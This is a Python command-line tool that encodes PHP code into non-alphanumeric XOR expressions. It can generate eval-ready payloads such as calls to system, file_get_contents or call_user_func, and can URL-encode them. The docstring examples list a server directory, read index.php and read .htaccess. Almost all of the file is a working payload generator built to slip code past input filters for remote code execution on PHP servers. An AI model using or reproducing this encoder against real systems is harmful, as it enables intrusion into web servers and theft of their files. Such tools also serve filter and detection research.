#!/usr/bin/env python3

"""PHP non-alphanumeric encoder
Usage:
  phpnonalphanum.py [-u] <php_code>
  phpnonalphanum.py [-u] [-e] -x <function> <parameters>...
  phpnonalphanum.py (-h | --help)

Options:
  -e                             Echo the payload result. Default behavior will execute the payload, but you might need to echo the result. (Actually calls printf)
  -u                             URL encode every character of the payload.
  -x <function> <parameters>...  Generate PHP code ready to be passed in an 'eval' function. Default behavior just encodes a PHP string.
  -h --help                      Shows this message.

Examples:
  phpnonalphanum.py 'echo base64_encode(file_get_contents("index.php"))'
  phpnonalphanum.py -x 'system' 'ls'
  phpnonalphanum.py -u -e -x 'call_user_func' 'file_get_contents' '.htaccess'

Credits for crafting characters with bitwise operations goes to 0xchrisb on GitHub:
https://github.com/0xchrisb/thesis-non-alphanumeric-code-generator/blob/master/Generating%20Code%20by%20using%20Bitwise%20Operations/php_and_perl_code_by_using_bitwise_operations.pl
"""

import docopt
import sys
import random

# Credit for that: https://github.com/0xchrisb/thesis-non-alphanumeric-code-generator/blob/master/Generating%20Code%20by%20using%20Bitwise%20Operations/php_and_perl_code_by_using_bitwise_operations.pl
charset = {
    "a": [
        "('^'^'?')",
        "('<'^']')",
        "('='^'\\\\')",
        "('>'^'_')",
        "('_'^'>')",
        "(':'^'[')",
        "('?'^'^')",
        "('['^':')",
        "(']'^'<')",
        "('\\\\'^'=')",
    ],
    "b": [
        "('^'^'<')",
        "('<'^'^')",
        "('='^'_')",
        "('>'^'\\\\')",
        "('_'^'=')",
        "('?'^']')",
        "('\"'^'@')",
        "(']'^'?')",
        "('@'^'\"')",
        "('\\\\'^'>')",
    ],
    "c": [
        "('^'^'=')",
        "('<'^'_')",
        "('='^'^')",
        "('>'^']')",
        "('_'^'<')",
        "('?'^'\\\\')",
        "(']'^'>')",
        "('@'^'#')",
        "('\\\\'^'?')",
        "('#'^'@')",
    ],
    "d": [
        "('^'^':')",
        "('_'^';')",
        "(';'^'_')",
        "(':'^'^')",
        "('?'^'[')",
        "('['^'?')",
        "('@'^'$')",
        "('$'^'@')",
    ],
    "e": [
        "('^'^';')",
        "('>'^'[')",
        "('_'^':')",
        "(';'^'^')",
        "(':'^'_')",
        "('['^'>')",
        "('@'^'%')",
        "('%'^'@')",
    ],
    "f": [
        "('='^'[')",
        "(';'^']')",
        "(':'^'\\\\')",
        "('['^'=')",
        "(']'^';')",
        "('\\\\'^':')",
    ],
    "g": [
        "('<'^'[')",
        "(';'^'\\\\')",
        "(':'^']')",
        "('\\''^'@')",
        "('['^'<')",
        "(']'^':')",
        "('@'^'\\'')",
        "('\\\\'^';')",
    ],
    "h": ["('('^'@')", "('@'^'(')"],
    "i": ["(')'^'@')", "('@'^')')"],
    "j": ["('@'^'*')", "('*'^'@')"],
    "k": ["('@'^'+')", "('+'^'@')"],
    "l": ["(','^'@')", "('@'^',')"],
    "m": ["('-'^'@')", "('@'^'-')"],
    "n": ["('.'^'@')", "('@'^'.')"],
    "o": ["('/'^'@')", "('@'^'/')"],
    "p": [
        "('^'^'.')",
        "('_'^'/')",
        "('-'^']')",
        "(','^'\\\\')",
        "('/'^'_')",
        "('.'^'^')",
        "('['^'+')",
        "(']'^'-')",
        "('\\\\'^',')",
        "('+'^'[')",
    ],
    "q": [
        "('^'^'/')",
        "('_'^'.')",
        "('-'^'\\\\')",
        "(','^']')",
        "('/'^'^')",
        "('.'^'_')",
        "('['^'*')",
        "(']'^',')",
        "('*'^'[')",
        "('\\\\'^'-')",
    ],
    "r": [
        "('^'^',')",
        "('_'^'-')",
        "('-'^'_')",
        "(','^'^')",
        "('/'^']')",
        "('.'^'\\\\')",
        "(')'^'[')",
        "('['^')')",
        "(']'^'/')",
        "('\\\\'^'.')",
    ],
    "s": [
        "('^'^'-')",
        "('_'^',')",
        "('-'^'^')",
        "(','^'_')",
        "('/'^'\\\\')",
        "('.'^']')",
        "('('^'[')",
        "('['^'(')",
        "(']'^'.')",
        "('\\\\'^'/')",
    ],
    "t": [
        "('^'^'*')",
        "('_'^'+')",
        "('/'^'[')",
        "('('^'\\\\')",
        "(')'^']')",
        "('['^'/')",
        "(']'^')')",
        "('*'^'^')",
        "('\\\\'^'(')",
        "('+'^'_')",
    ],
    "u": [
        "('^'^'+')",
        "('_'^'*')",
        "('.'^'[')",
        "('('^']')",
        "(')'^'\\\\')",
        "('['^'.')",
        "(']'^'(')",
        "('*'^'_')",
        "('\\\\'^')')",
        "('+'^'^')",
    ],
    "v": [
        "('^'^'(')",
        "('_'^')')",
        "('-'^'[')",
        "('('^'^')",
        "(')'^'_')",
        "('['^'-')",
        "(']'^'+')",
        "('*'^'\\\\')",
        "('\\\\'^'*')",
        "('+'^']')",
    ],
    "w": [
        "('^'^')')",
        "('_'^'(')",
        "(','^'[')",
        "('('^'_')",
        "(')'^'^')",
        "('['^',')",
        "(']'^'*')",
        "('*'^']')",
        "('\\\\'^'+')",
        "('+'^'\\\\')",
    ],
    "x": [
        "('_'^'\\'')",
        "('\\''^'_')",
        "('['^'#')",
        "(']'^'%')",
        "('$'^'\\\\')",
        "('\\\\'^'$')",
        "('#'^'[')",
        "('%'^']')",
    ],
    "y": [
        "('^'^'\\'')",
        "('_'^'&')",
        "('\\''^'^')",
        "('\"'^'[')",
        "('['^'\"')",
        "(']'^'$')",
        "('$'^']')",
        "('\\\\'^'%')",
        "('%'^'\\\\')",
    ],
    "z": [
        "('^'^'$')",
        "('_'^'%')",
        "(':'^'@')",
        "('\\''^']')",
        "(']'^'\\'')",
        "('@'^':')",
        "('$'^'^')",
        "('%'^'_')",
    ],
    "A": [
        "('~'^'?')",
        "('<'^'}')",
        "(':'^'{')",
        "('?'^'~')",
        "('{'^':')",
        "('}'^'<')",
    ],
    "B": [
        "('`'^'\"')",
        "('~'^'<')",
        "('<'^'~')",
        "('?'^'}')",
        "('\"'^'`')",
        "('}'^'?')",
    ],
    "C": [
        "('`'^'#')",
        "('~'^'=')",
        "('='^'~')",
        "('>'^'}')",
        "('}'^'>')",
        "('#'^'`')",
    ],
    "D": [
        "('`'^'$')",
        "('~'^':')",
        "(':'^'~')",
        "('?'^'{')",
        "('{'^'?')",
        "('$'^'`')",
    ],
    "E": [
        "('`'^'%')",
        "('~'^';')",
        "('>'^'{')",
        "(';'^'~')",
        "('{'^'>')",
        "('%'^'`')",
    ],
    "F": ["('='^'{')", "(';'^'}')", "('{'^'=')", "('}'^';')"],
    "G": [
        "('`'^'\\'')",
        "('<'^'{')",
        "(':'^'}')",
        "('\\''^'`')",
        "('{'^'<')",
        "('}'^':')",
    ],
    "H": ["('`'^'(')", "('('^'`')"],
    "I": ["('`'^')')", "(')'^'`')"],
    "J": ["('`'^'*')", "('*'^'`')"],
    "K": ["('`'^'+')", "('+'^'`')"],
    "L": ["('`'^',')", "(','^'`')"],
    "M": ["('`'^'-')", "('-'^'`')"],
    "N": ["('`'^'.')", "('.'^'`')"],
    "O": ["('`'^'/')", "('/'^'`')"],
    "P": [
        "('~'^'.')",
        "('-'^'}')",
        "('.'^'~')",
        "('{'^'+')",
        "('}'^'-')",
        "('+'^'{')",
    ],
    "Q": [
        "('~'^'/')",
        "(','^'}')",
        "('/'^'~')",
        "('{'^'*')",
        "('}'^',')",
        "('*'^'{')",
    ],
    "R": [
        "('~'^',')",
        "(','^'~')",
        "('/'^'}')",
        "(')'^'{')",
        "('{'^')')",
        "('}'^'/')",
    ],
    "S": [
        "('~'^'-')",
        "('-'^'~')",
        "('.'^'}')",
        "('('^'{')",
        "('{'^'(')",
        "('}'^'.')",
    ],
    "T": [
        "('~'^'*')",
        "('/'^'{')",
        "(')'^'}')",
        "('{'^'/')",
        "('}'^')')",
        "('*'^'~')",
    ],
    "U": [
        "('~'^'+')",
        "('.'^'{')",
        "('('^'}')",
        "('{'^'.')",
        "('}'^'(')",
        "('+'^'~')",
    ],
    "V": [
        "('~'^'(')",
        "('-'^'{')",
        "('('^'~')",
        "('{'^'-')",
        "('}'^'+')",
        "('+'^'}')",
    ],
    "W": [
        "('~'^')')",
        "(','^'{')",
        "(')'^'~')",
        "('{'^',')",
        "('}'^'*')",
        "('*'^'}')",
    ],
    "X": ["('{'^'#')", "('}'^'%')", "('#'^'{')", "('%'^'}')"],
    "Y": [
        "('~'^'\\'')",
        "('\\''^'~')",
        "('\"'^'{')",
        "('{'^'\"')",
        "('}'^'$')",
        "('$'^'}')",
    ],
    "Z": [
        "('`'^':')",
        "('~'^'$')",
        "(':'^'`')",
        "('\\''^'}')",
        "('}'^'\\'')",
        "('$'^'~')",
    ],
    "1": [
        "('['^('@'^'*'))",
        "('{'^('`'^'*'))",
        "(']'^(','^'@'))",
        "('}'^('`'^','))",
        "('\\\\'^('-'^'@'))",
        "('_'^('.'^'@'))",
        "('^'^('/'^'@'))",
        "('~'^('`'^'/'))",
        "('@'^('_'^'.'))",
        "('`'^('~'^'/'))",
    ],
    "2": [
        "('['^(')'^'@'))",
        "('{'^('`'^')'))",
        "('^'^(','^'@'))",
        "('~'^('`'^','))",
        "('_'^('-'^'@'))",
        "('\\\\'^('.'^'@'))",
        "(']'^('/'^'@'))",
        "('}'^('`'^'/'))",
        "('@'^('_'^'-'))",
        "('`'^(','^'~'))",
    ],
    "3": [
        "('['^('('^'@'))",
        "('{'^('`'^'('))",
        "('_'^(','^'@'))",
        "('^'^('-'^'@'))",
        "('~'^('`'^'-'))",
        "(']'^('.'^'@'))",
        "('}'^('`'^'.'))",
        "('\\\\'^('/'^'@'))",
        "('@'^('_'^','))",
        "('`'^('~'^'-'))",
    ],
    "4": [
        "('\\\\'^('('^'@'))",
        "(']'^(')'^'@'))",
        "('}'^('`'^')'))",
        "('^'^('@'^'*'))",
        "('~'^('`'^'*'))",
        "('_'^('@'^'+'))",
        "('['^('/'^'@'))",
        "('{'^('`'^'/'))",
        "('@'^('_'^'+'))",
        "('`'^('~'^'*'))",
    ],
    "5": [
        "(']'^('('^'@'))",
        "('}'^('`'^'('))",
        "('\\\\'^(')'^'@'))",
        "('_'^('@'^'*'))",
        "('^'^('@'^'+'))",
        "('~'^('`'^'+'))",
        "('['^('.'^'@'))",
        "('{'^('`'^'.'))",
        "('@'^('_'^'*'))",
        "('`'^('~'^'+'))",
    ],
    "6": [
        "('^'^('('^'@'))",
        "('~'^('`'^'('))",
        "('_'^(')'^'@'))",
        "('\\\\'^('@'^'*'))",
        "(']'^('@'^'+'))",
        "('}'^('`'^'+'))",
        "('['^('-'^'@'))",
        "('{'^('`'^'-'))",
        "('@'^('_'^')'))",
        "('`'^('~'^'('))",
    ],
    "7": [
        "('_'^('('^'@'))",
        "('^'^(')'^'@'))",
        "('~'^('`'^')'))",
        "(']'^('@'^'*'))",
        "('}'^('`'^'*'))",
        "('\\\\'^('@'^'+'))",
        "('['^(','^'@'))",
        "('{'^('`'^','))",
        "('@'^('_'^'('))",
        "('`'^('~'^')'))",
    ],
    "8": [
        "('['^('?'^'\\\\'))",
        "('{'^('~'^'='))",
        "('\\\\'^('_'^';'))",
        "(']'^('_'^':'))",
        "('}'^(';'^'~'))",
        "('^'^(';'^']'))",
        "('~'^(';'^'}'))",
        "('_'^(';'^'\\\\'))",
        "('@'^('_'^'\\''))",
        "('`'^('{'^'#'))",
    ],
    "9": [
        "('['^('@'^'\"'))",
        "(']'^('_'^';'))",
        "('}'^('~'^':'))",
        "('\\\\'^('_'^':'))",
        "('_'^(';'^']'))",
        "('^'^(';'^'\\\\'))",
        "('~'^(':'^'}'))",
        "('@'^('_'^'&'))",
        "('`'^('~'^'\\''))",
    ],
    "0": [
        "('['^('@'^'+'))",
        "('{'^('`'^'+'))",
        "('\\\\'^(','^'@'))",
        "(']'^('-'^'@'))",
        "('}'^('`'^'-'))",
        "('^'^('.'^'@'))",
        "('~'^('`'^'.'))",
        "('_'^('/'^'@'))",
        "('@'^('_'^'/'))",
        "('`'^('-'^'}'))",
    ],
    "|": [
        "('\"'^'^')",
        "('@'^'<')",
        "('<'^'@')",
        "(' '^'\\\\')",
        "('_'^'#')",
        "('#'^'_')",
        "('['^'\\'')",
        "('^'^'\"')",
        "('\\\\'^' ')",
    ],
    "!": ["('_'^'~')", "('~'^'_')"],
    "&": ["('}'^'[')", "('{'^']')", "(']'^'{')", "('['^'}')"],
}


def encode(plaintext):
    encoded = []
    for c in plaintext:
        if c in charset.keys():
            x = random.choice(charset[c])
        else:
            if c == "\\":
                x = "'\\\\'"
            elif c == "'":
                x = "'\\''"
            else:
                x = "'{}'".format(c)
        encoded.append(x)
    return ".".join(encoded)


def generate_eval_string(function, parameters, echo=False):
    payload = "$_={};".format(encode(function))
    variables = []
    for param in parameters:
        var = "$" + "_" * (parameters.index(param) + 2)
        variables.append(var)
        payload += "{}={};".format(var, encode(param))
    if echo:
        payload += "$ε={};$ε(".format(encode("printf"))
    payload += "$_({})".format(",".join(variables))
    if echo:
        payload += ")"
    payload += ";"
    return payload


def urlencode(payload):
    encoded = ""
    for c in payload:
        if c == "ε":
            encoded += "%CE%B5"
        else:
            encoded += "%{0:0>2}".format(format(ord(c), "x")).upper()
    return encoded


if __name__ == "__main__":
    args = docopt.docopt(__doc__)
    if args["<php_code>"]:
        payload = encode(args["<php_code>"])
    elif args["-x"]:
        function = args["-x"]
        parameters = args["<parameters>"]
        payload = generate_eval_string(function, parameters, args["-e"])
    if args["-u"]:
        payload = urlencode(payload)

    print(payload)
